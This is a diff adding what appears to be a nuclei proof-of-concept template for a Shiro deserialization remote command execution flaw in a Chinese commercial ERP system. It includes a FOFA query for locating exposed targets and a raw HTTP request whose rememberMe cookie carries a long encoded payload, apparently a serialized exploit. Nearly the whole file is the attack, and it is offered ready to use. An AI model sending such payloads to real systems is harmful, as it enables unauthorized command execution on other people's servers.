@@ -1,0 +1,28 @@
+id: poc-hsrauaug9etulcnf
+info:
+  name: 云时空社会化商业ERP shiro反序列化远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hsrauaug9etulcnf'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hsrauaug9etulcnf
+    fofa: title="云时空社会化商业ERP系统"
+http:
+- raw:
+  - 'GET /static/js/public.js HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    Cookie: rememberMe=ZkQwQ0NGMEY4ZDhhZjRkQk1PeiBePyZcAaJE7Om+C0hA3jDtN5dVqFAyh+gGxrjM3fdJJFsrOhEOImJ3fCkQTtim1uKYvYhbi2OI/9Kg1Pw8TBrKecFPuI9P8+bEBA2Gin4ksL6+CVrasvh4M+tdwhYyRKyOzqjnszwltyit+VmMzH+gY6SGBYXRDH9NQ7EoRBiSh4uSkPVkj9iIG8eebwjjwoXtR+YapiLcdLhNL/j1/tEVA/yIi84iEWeJQw68POhPeVrTfjBWd48cv1tKokevJeyD8kyh2vkE1leum9mUtoBkiQcnUf30UETOwbXYQv7rejfrVqAYO8A2aSdMRH5DGQzcB4ZFe7e79dYNxxol5pjy46kxohfrGPUGrpUNMEiOOY7GCBBjQF+rVCjrTBvvm8QWHoxLFhmcg4i2ZCshDLtKp24/b+OWtHAfHX+6jYnPKQ49BwwvkUChbTAp/1IS3EYhvaneW6sLxYgLW2DkWOVyHfGyCHl1k3MIZi1Vl6sG/JsWLbLyh+sh8H+73ndNd+SeGs53lO7/dd/5V4AkUeLAS4Y817SYrhGxFW7U/EyV/+1p4/Ya8FHhQYlcc/pFe9Somlmss1ax63WRswo8R+3I24L3mp+5o7xv17m+PEQTm9Pb+/81GFoAgVYcGNXDjtd7dD76uVn9YVEL6UE936jVbsFo/FJb/QqL1rxlPnBD9HHm15UYigKtXIk+/n0wW8rwIImyF5JofTfFcArD8Ibxx1qI+rDMB37F2CeL2+tuMRuYxugUSZ5px79W2QUlhKD/+9F4QiJ2MsmWJ99LQghPqqhdoypK50DaX1ITi64Y6c2I40pd16/DdAr1sFiQXw6paoqeRfqxzydxebnfEz02hhmscGIc5QwMzqi6VzoCW5XJvIB6azK0LQVjatSZvCBCmQU9n8kqjz6YfODvwUImVgtOHWIts0VXuETNI8IYGOmuirPQwNfWDhfKw2Ddy5QTqL+akSU2EHd/Jjn4blVocPsbU86/XNbdRBPPbCq0aDXJCli1BAhu2GSLcev0t9Qn9UyWqzEAxCkQbFD5fnKM55XOSowh9oO8STndvOzxbm82EoHnUKTUbWWZnFxip4QBzLZh7Fyh9z9y+UoB1AgCzzA876xtQW7RgL/Q2h+lGtpXCEwZq7lGkrKScetgLS+yMBTE/FplOgdfl7bp0zWXCMyFj6scO5jGIhxJjRM1mIelOpYGyWsf5VQ2tipD9y9g7nIKgpMgccYRFOPlDHFcQ9muJhp8vO6S+VQBTiWwQQELNEDku+urTHa9zX2uvaINqWMfm5eRJvoJQjy8UYJib1Sgrxf5Xf1LfFPZVnaY1tqRiSaLG83RWUeBsFabNtQh7obsZ27H2EsUh/reF2s9XBy003gZUZ0lI2QtV2HZE7v01WgXhlS1li5ZxH6mOpyljB3TTDaM8Z0BaIlgI43dY+RxswMkfwKwMW8gQOGl6q4AHsboX2Awv8Vxs7kWWVBA+k4qdaPhRy83ZhLIIlx/dvCP/Y6y8McRe7dYnXmHlhNetsEi8lDX/fODPGVUYh53zoOxZp8lqIsU+xe3qrM7p6GfaWSVM3MOhbwIGYvZEhDW5F1ewilRPFgQbLUkfJH9Eiz/VG9j4Dw2xz6bCIqKd/iGglNd9C9QQ24BujKY+TBO5AcT3F23Ytq27tYyun193Sf0cwO1+zgeOwjQWJksxDP6o65bzWL/P0ZafoXp1SU/jFsNoSyVjSFZGbYU00Qy7xz0/piX842kL8KvQI44Oj6aJ30JVVbKbvBu14axyzvUISMHB1qhzpQvOWs0K+W3dlkY7sR0tffRN/gKWRCqilsxjcrRVmx5RiBtuT8cBn8z1SLnqz8SP5ujsmGGtiFUaao5vez98yfeI/GT14c8p3Eo/'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
